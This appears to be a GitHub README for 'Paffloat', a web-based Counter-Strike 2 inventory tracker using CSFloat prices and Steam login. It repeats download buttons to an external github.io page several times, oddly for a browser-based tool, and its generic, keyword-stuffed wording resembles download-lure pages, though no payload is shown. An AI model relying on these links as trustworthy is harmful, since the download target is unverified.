# Paffloat v1.1 - inventory price tracker 2026

> **Paffloat v1.1 brings web-based Counter-Strike 2 inventory valuation with live CSFloat pricing, Steam OpenID sign-in, and built-in ROI analysis.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/seanyoung84/paffloat-cs2-price-tracker?style=flat-square)](https://github.com/seanyoung84/paffloat-cs2-price-tracker)

---

<p align="center">
  <a href="https://seanyoung84.github.io/paffloat-cs2-price-tracker/">
    <img src="https://img.shields.io/badge/Download-Paffloat%20Latest-brightgreen?style=for-the-badge" alt="Download Paffloat">
  </a>
</p>

> **[Download Paffloat v1.1](https://seanyoung84.github.io/paffloat-cs2-price-tracker/)**

---

[Download Latest Build](https://seanyoung84.github.io/paffloat-cs2-price-tracker/)

---

## Overview

Paffloat is a browser-accessible inventory pricing tool for Counter-Strike 2 items. It pairs inventory tracking with live CSFloat estimates, giving you a single place to inspect item value without bouncing between different services.

The app is geared toward users who want to understand inventory performance, purchase results, and item-by-item value movement more clearly. With Steam OpenID login, currency conversion, and ROI calculations, Paffloat turns inventory data into a more practical view of value.

---

## What it does

- Monitors Counter-Strike 2 inventory value in one interface
- Retrieves live CSFloat price estimates for items
- Works with Steam OpenID authentication
- Performs USD to EUR conversion on the fly
- Computes purchase profit and ROI
- Supports stackable item lots
- Provides sorting and filtering tools for inventory analysis
- Designed for web access and usage

---

## Installation

Clone the repository or download the project files, then place them in your preferred web or Docker setup.

    git clone https://github.com/seanyoung84/paffloat-cs2-price-tracker.git
    cd paffloat

If Docker is part of your deployment, build and launch the container using your local setup conventions. For a traditional web host, load the app through your server or local preview once the files are in place.

---

## Usage

1. Open Paffloat in your browser.
2. Sign in with Steam OpenID when authentication is required.
3. Let the app fetch inventory data and live CSFloat estimates.
4. Review totals, ROI, and profit estimates.
5. Use sorting and filtering to narrow down specific items or lots.
6. Compare values in USD or EUR as needed.

For best results, refresh data when your inventory changes or when market estimates need to be updated.

---

## Configuration

Paffloat is typically configured through the application settings and deployment environment.

    {
      "currency": "EUR",
      "price_source": "CSFloat",
      "auth": "Steam OpenID",
      "inventory_mode": "CS2",
      "stackable_lots": true
    }

If you are deploying with Docker, keep environment variables and runtime settings in your container configuration. For local setups, review the app files and server settings used by your host.

---

## Requirements

- Web-capable environment
- Access to Steam OpenID for authentication
- Internet access for live CSFloat pricing
- A current browser for the interface
- Docker if you choose containerized deployment

---

## FAQ

**How do I update to a newer version?**  
Download the latest build from the project page and replace your existing deployment or files as needed.

**Why are prices changing over time?**  
Paffloat relies on live CSFloat estimates, so values can change as market data updates.

**Can I use different currencies?**  
The app includes USD to EUR conversion support. Additional currency behavior depends on your setup.

**Where are sorting and filtering controlled?**  
These options are available in the interface for inventory review and item comparison.

**What should I check if Steam login fails?**  
Confirm that Steam OpenID is available and that your deployment can reach the required authentication endpoints.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
